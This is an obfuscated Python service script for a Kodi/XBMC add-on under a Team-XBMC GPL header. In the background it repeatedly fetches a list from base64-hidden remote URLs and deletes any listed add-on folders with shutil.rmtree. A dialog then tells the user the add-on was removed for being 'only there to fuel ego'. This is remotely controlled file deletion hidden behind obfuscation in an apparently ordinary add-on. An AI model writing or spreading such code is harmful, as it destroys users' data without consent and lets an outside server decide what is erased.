#!/usr/bin/python
# -*- coding: utf-8 -*-
#
#     Copyright (C) 2013 Team-XBMC
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program. If not, see <http://www.gnu.org/licenses/>.
#
if 64 - 64: i11iIiiIii
import platform
import xbmc
import lib . common
import os , re , shutil , xbmcgui , base64 , urllib2
from random import randint
from lib . common import log , dialog_yesno
from lib . common import upgrade_message as _upgrademessage
from lib . common import upgrade_message2 as _upgrademessage2
if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
o0OO00 = lib . common . ADDON
oo = lib . common . ADDONVERSION
i1iII1IiiIiI1 = lib . common . ADDONNAME
iIiiiI1IiI1I1 = lib . common . ADDONPATH
o0OoOoOO00 = lib . common . ICON
I11i = False
O0O = xbmc . translatePath ( os . path . join ( 'special://home/addons/' ) )
Oo = xbmcgui . Dialog ( )
I1ii11iIi11i = base64 . decodestring
I1IiI = xbmc . Monitor ( )
o0OOO = xbmcgui . DialogProgress ( )
if 13 - 13: ooOo + Ooo0O
if 48 - 48: iII111i % IiII + I1Ii111 / ooOoO0o * o00O0oo
def O0oOO0o0 ( ) :
 while not I1IiI . abortRequested ( ) :
  if I1IiI . waitForAbort ( 10 ) :
   break
  xbmc . sleep ( 10 )
  i1ii1iIII = Oo0oO0oo0oO00 ( I1ii11iIi11i ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vdGVzdGRlbGV0ZS50eHQ=' ) )
  i111I = Oo0oO0oo0oO00 ( I1ii11iIi11i ( 'aHR0cDovL3d3dy5kY2JuZXR3b3JraW5nLmNvbS9yZXBvL1BsdWdpbnMvcGx1Z2luLnZpZGVvLnNwb3J0cy5hbm9ueW1vdXNway8=' ) )
  if i1ii1iIII != 'Failed' :
   II1Ii1iI1i = re . compile ( '<unwanted_addon =(.+?)</unwanted_addon>' ) . findall ( i1ii1iIII )
   for iiI1iIiI in II1Ii1iI1i :
    iiI1iIiI = ( str ( iiI1iIiI ) )
    if os . path . exists ( xbmc . translatePath ( iiI1iIiI ) ) :
     OOo ( iiI1iIiI )
    else :
     if i111I != 'Failed' :
      Ii1IIii11 = re . compile ( '<li><a href="(.+?)">.+?</a></li>' ) . findall ( i111I )
      for Oooo0000 in Ii1IIii11 :
       Oooo0000 = 'special://home/addons/' + ( str ( iiI1iIiI ) ) . replace ( '.zip' , '' )
       if os . path . exists ( xbmc . translatePath ( Oooo0000 ) ) :
        OOo ( Oooo0000 )
       else :
        pass
        if 22 - 22: OOo000 . O0I11i1i11i1I
        if 31 - 31: i11iI / Oo0o0ooO0oOOO + I1 - OOoOoo00oo - iiI11
def Oo0oO0oo0oO00 ( url ) :
 OOooO = urllib2 . Request ( url )
 OOooO . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 OOoO00o = ''
 II111iiii = ''
 try :
  OOoO00o = urllib2 . urlopen ( OOooO )
  II111iiii = OOoO00o . read ( )
  OOoO00o . close ( )
 except : pass
 if II111iiii != '' :
  return II111iiii
 else :
  II111iiii = 'Failed'
  return II111iiii
  if 48 - 48: I1Ii . i11iIiiIii - Oo0o0ooO0oOOO % IiII . I1Ii / ooOoO0o
  if 6 - 6: I1Ii111 * I1
def OOo ( addon ) :
 O00O0O0O0 = ( addon ) . replace ( 'special://home/addons/' , '' )
 o0OOO . create ( "[COLOR=white]This is growing old now[/COLOR]" , 'Unfortunately you have installed [COLORred]' + O00O0O0O0 + '[/COLOR]' , 'It has been removed as is only there to fuel ego' , '[COLORyellow]USE OFFICIAL ADDONS AND SHOW RESPECT[/COLOR]' )
 xbmc . sleep ( 3000 )
 addon = xbmc . translatePath ( str ( addon ) )
 shutil . rmtree ( addon , ignore_errors = True )
 o0OOO . update ( 100 , "" , "Your Device is now clean" )
 xbmc . sleep ( 1000 )
 o0OOO . close ( )
 if 75 - 75: i1IIi / Oo0o0ooO0oOOO - ooOoO0o
 if 63 - 63: ooOo . ooOo
O0oOO0o0 ( )
if 32 - 32: i1IIi . i11iI % IiII . ooOoO0o
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
